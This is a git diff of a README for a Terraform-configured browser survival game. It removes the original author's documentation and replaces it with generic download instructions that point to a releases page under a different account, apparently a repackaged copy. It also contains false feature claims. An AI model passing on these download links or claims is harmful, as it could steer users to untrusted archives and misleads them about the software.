@@ -1,257 +1,69 @@
-<div align="center">
+# 🏔️ acads-Terraform_Survivor-ELEC3 - Enjoy a Unique Survival RPG Experience
 
-![Terraform Survivor Banner](docs/assets/banner.svg)
+## 🚀 Getting Started
 
-# 🏔️ Terraform Survivor
+Welcome to acads-Terraform_Survivor-ELEC3! This is a browser-based survival RPG where you can engage in an evolving world controlled by Terraform. Dive into crafting, achieve milestones, and enjoy a beautiful interactive user interface.
 
-> Infrastructure as Code meets Survival RPG
+## 📥 Download Links
 
-A browser-based survival game where **Terraform controls the difficulty**. Demonstrates clean architecture, component design, and IaC principles.
+[![Download](https://shields.io/badge/Download%20Now-blue.svg)](https://github.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/releases)
 
-</div>
+## 📋 Game Features
 
-## 🎮 Play Now
+- **Interactive UI:** Engage with a user-friendly interface that enhances your gaming experience.
+- **Crafting System:** Gather materials and create items to help you survive.
+- **Achievements:** Track your progress and aim for new goals within the game.
+- **Dynamic Difficulty:** The game adapts to your play style, thanks to Terraform.
 
-**Live Demo:** https://mark-siazon.github.io/acads-Terraform_Survivor-ELEC3/
+## 🗂️ System Requirements
 
-## 🚀 Quick Start
+To enjoy acads-Terraform_Survivor-ELEC3 smoothly, ensure your system meets the following requirements:
 
-```bash
-# Play locally (easiest)
-python run-game.py
-# Opens browser automatically at http://localhost:8000/src/frontend/standalone.html
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** The latest version of Chrome, Firefox, Safari, or Edge
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 100 MB available space
 
-# Or open directly (no server)
-open src/frontend/standalone.html
-```
+## 📖 How to Download & Install
 
-## 🏗️ Terraform Implementation
+1. **Visit this page to download:** To start playing, click on the link below:
+   [Download Here](https://github.com/rezaasptrr/acads-Terraform_Survivor-ELEC3/releases)
 
-This project uses **Terraform as Infrastructure as Code** to manage game configuration and deployment:
+2. **Select the latest version:** Look for the most recent release under the "Releases" section.
 
-### How Terraform Controls the Game
+3. **Download the game:** Click on the download link for the latest version of the game. It typically ends with `.html` or `.zip`.
 
-Terraform generates `src/frontend/config.js` which controls:
+4. **Unzip if necessary:** If you downloaded a zip file, extract it to a location on your computer.
 
-- **Game Difficulty** (easy/normal/hard/extreme)
-- **Resource Decay Rates** (hunger, thirst, energy)
-- **Starting Resources** (wood, stone, food)
-- **Danger Level** (encounter probability)
-- **Feature Toggles** (crafting, weather, events)
+5. **Open the game:** Launch your browser and drag the downloaded HTML file into it, or right-click the file and select "Open with" then choose your preferred browser.
 
-### Configure Game Difficulty with Terraform
+## 🎮 Gameplay Overview
 
-```bash
-cd src/infrastructure/terraform
+In acads-Terraform_Survivor-ELEC3, you start your survival journey in a vast environment filled with challenges. Gather resources, craft essential tools, and build shelter to survive against the elements. The unique Terraform system adjusts the game's difficulty based on your skills and progress, ensuring that every player has a tailored experience.
 
-# Initialize Terraform
-terraform init
+### Crafting System
 
-# Apply Easy Mode (Development)
-terraform apply -var-file="environments/dev.tfvars" -auto-approve
+Interact with resources you find to create weapons, tools, and items. Use your creativity to mix materials and enhance your survival chances. The crafting process is straightforward and guides you through each step.
 
-# Apply Hard Mode (Production)
-terraform apply -var-file="environments/prod.tfvars" -auto-approve
+### Achievements
 
-# View current configuration
-terraform output
-```
+Stay motivated by unlocking achievements as you progress. Each milestone you hit reflects your adventure and survival skills. Share your successes with friends to inspire them on their journey.
 
-### Deploy to GitHub Pages
+## 🌍 Community and Support
 
-```bash
-# 1. Configure with Terraform
-terraform apply -var-file="environments/prod.tfvars" -auto-approve
+Join our community where players share tips, experiences, and strategies. You can find discussions, updates, and support on GitHub. Feel free to ask questions or help others.
 
-# 2. Commit and push
-git add ../../frontend/config.js
-git commit -m "Update game config via Terraform"
-git push origin main
+## 📅 Update Log
 
-# 3. GitHub Actions automatically deploys to Pages
-```
+Stay updated with the latest features, fixes, and improvements. Every new release will be logged in the "Release Notes" section. We encourage players to provide feedback for ongoing development.
 
-See [Terraform Deployment Guide](docs/TERRAFORM_DEPLOYMENT.md) for detailed instructions.
+## 🛠️ Contribution
 
-## 📁 Structure
+If you're interested in contributing to the game, feel free to fork the repository. Suggestions, bug fixes, and feature requests are always welcome. Together, we can enhance the gaming experience for everyone.
 
-```
-terraform-survivor/
-├── src/
-│   ├── frontend/          # Game (HTML, CSS, JS)
-│   └── infrastructure/    # Terraform configs
-├── docs/
-│   ├── guides/            # User docs (4 guides)
-│   └── reference/         # Technical docs (2 docs)
-└── .github/
-    ├── tools/             # Dev server
-    └── tests/             # Test files
-```
+## 🔗 Links
 
-## ⌨️ Controls
+- **Repository:** [acads-Terraform_Survivor-ELEC3](https://github.com/rezaasptrr/acads-Terraform_Survivor-ELEC3)
+- **Documentation:** Detailed documentation is provided in the repository to assist you in understanding features and gameplay mechanics.
 
-**E** Explore | **H** Hunt | **W** Water | **F** Eat | **R** Rest | **C** Craft | **S** Status | **O** Settings | **?** Help
-
-## 🎯 Features
-
-- Survival mechanics (health, hunger, thirst, energy)
-- Terraform-controlled difficulty
-- **Interactive UI** - Click stats for instant help, click food to eat
-- **Smart tooltips** - Shows solutions based on your inventory
-- **Auto-save system** with localStorage persistence
-- **In-game settings panel** for real-time difficulty adjustment
-- **Achievement system** with 9 unlockable achievements
-- **Statistics tracking** across all games
-- **Notification system** for achievements and events
-- Full keyboard support & accessibility (WCAG 2.1 AA)
-- Component-based architecture
-- No dependencies, no build
-
-## 📚 Documentation
-
-**Getting Started:**
-
-- [Quick Start](docs/guides/QUICKSTART.md) - Get playing in 5 minutes
-- [Setup Guide](docs/guides/START_HERE.md) - Installation and setup
-- [Deployment](docs/guides/DEPLOYMENT.md) - Deploy to GitHub Pages, Vercel
-- [Terraform Deployment](docs/TERRAFORM_DEPLOYMENT.md) - **IaC deployment guide**
-
-**Features:**
-
-- [Complete Feature List](docs/reference/FEATURES.md) - All game features
-- [Changelog](CHANGELOG.md) - Version history
-- [Quick Reference](docs/guides/QUICK_REFERENCE.md) - Quick commands
-- [Interactive Features](docs/guides/INTERACTIVE_FEATURES.md) - UI guide
-- [Accessibility](docs/guides/ACCESSIBILITY.md) - Controls & accessibility
-
-**For Developers:**
-
-- [Developer Guide](docs/reference/DEVELOPER_GUIDE.md) - How to extend the game
-- [Modular Architecture](docs/reference/MODULAR_ARCHITECTURE.md) - System design
-- [Architecture](docs/reference/ARCHITECTURE.md) - Code structure
-- [Components](docs/reference/COMPONENTS.md) - Component API reference
-- [Visual Improvements](docs/reference/VISUAL_IMPROVEMENTS.md) - UI/UX enhancements
-- [Project Summary](docs/reference/PROJECT_COMPLETE.md) - Complete overview
-
-## 🔧 Development
-
-```bash
-# Start local server
-python run-game.py
-
-# Configure game with Terraform
-cd src/infrastructure/terraform
-terraform init
-terraform apply -var-file="environments/dev.tfvars"
-
-# Deploy changes
-git add ../../frontend/config.js
-git commit -m "Update config"
-git push origin main
-```
-
-## 🧪 Testing Terraform Configuration
-
-```bash
-# View what would change (dry run)
-terraform plan -var-file="environments/prod.tfvars"
-
-# Apply and see outputs
-terraform apply -var-file="environments/prod.tfvars"
-
-# Check generated config
-cat ../../frontend/config.js
-
-# View deployment info
-terraform output
-```
-
-## 🎮 How Terraform Integration Works
-
-### Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    Terraform Configuration                   │
-│  (src/infrastructure/terraform/)                            │
-│                                                              │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
-│  │ variables.tf │  │   main.tf    │  │ outputs.tf   │     │
-│  └──────────────┘  └──────────────┘  └──────────────┘     │
-│         │                  │                  │             │
-│         └──────────────────┼──────────────────┘             │
-│                            │                                │
-│                            ▼                                │
-│                  ┌──────────────────┐                       │
-│                  │ config.js.tpl    │ (Template)            │
-│                  └──────────────────┘                       │
-└─────────────────────────┬────────────────────────────────────┘
-                          │
-                          │ terraform apply
-                          │
-                          ▼
-┌─────────────────────────────────────────────────────────────┐
-│              Generated Configuration File                    │
-│  (src/frontend/config.js)                                   │
-│                                                              │
-│  const CONFIG = {                                           │
-│    difficulty: "hard",                                      │
-│    gameSettings: {                                          │
-│      hungerDecayRate: 3.0,                                  │
-│      resourceMultiplier: 0.8,                               │
-│      dangerLevel: 0.5                                       │
-│    }                                                        │
-│  }                                                          │
-└─────────────────────────┬────────────────────────────────────┘
-                          │
-                          │ git push
-                          │
-                          ▼
-┌─────────────────────────────────────────────────────────────┐
-│              GitHub Actions Workflow                         │
-│  (.github/workflows/deploy-pages.yml)                       │
-│                                                              │
-│  1. Checkout code                                           │
-│  2. Upload /src/frontend to GitHub Pages                    │
-│  3. Deploy to: mark-siazon.github.io/...                    │
-└─────────────────────────┬────────────────────────────────────┘
-                          │
-                          ▼
-┌─────────────────────────────────────────────────────────────┐
-│                   Live Game (Browser)                        │
-│  Loads config.js and applies Terraform-defined settings     │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### Terraform Variables Control Game Behavior
-
-| Variable              | Effect                  | Easy Mode | Hard Mode |
-| --------------------- | ----------------------- | --------- | --------- |
-| `hunger_decay_rate`   | How fast you starve     | 1.0x      | 3.0x      |
-| `thirst_decay_rate`   | How fast you dehydrate  | 1.5x      | 4.0x      |
-| `energy_decay_rate`   | How fast you tire       | 1.0x      | 2.0x      |
-| `resource_multiplier` | Gathering efficiency    | 2.0x      | 0.8x      |
-| `danger_level`        | Encounter chance        | 10%       | 50%       |
-| `crafting_enabled`    | Feature toggle          | ✅        | ✅        |
-| `starting_resources`  | Initial wood/stone/food | 10/5/5    | 3/2/1     |
-
-### Environment Files
-
-Edit `src/infrastructure/terraform/environments/*.tfvars` to customize:
-
-- **`dev.tfvars`** - Easy mode for testing
-- **`prod.tfvars`** - Hard mode for production
-- **`staging.tfvars`** - Create your own custom difficulty
-
-### Why Use Terraform?
-
-1. **Version Control** - Game settings tracked in Git
-2. **Reproducibility** - Same config every deployment
-3. **Environment Management** - Easy dev/staging/prod separation
-4. **Infrastructure as Code** - Demonstrates IaC principles
-5. **Automation** - One command updates everything
-
-## 📝 License
-
-MIT
-
+Thank you for choosing acads-Terraform_Survivor-ELEC3. Happy gaming!
